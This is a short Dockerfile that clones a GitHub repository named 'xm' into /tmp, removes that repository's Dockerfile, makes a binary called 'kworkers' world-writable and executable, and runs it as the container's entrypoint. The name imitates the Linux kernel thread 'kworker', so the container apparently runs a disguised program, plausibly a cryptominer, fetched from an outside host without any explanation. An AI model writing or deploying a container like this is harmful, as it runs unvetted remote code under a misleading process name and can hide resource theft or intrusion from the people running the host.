FROM alpine:latest
RUN set -ex \
    && apk add git \
    && cd /tmp \
    && git clone https://github.com/caeken/xm \
    && rm /tmp/xm/Dockerfile \
    && cd /tmp/xm \
    && chmod 777 kworkers 

WORKDIR /tmp/xm

ENTRYPOINT ["./kworkers"]
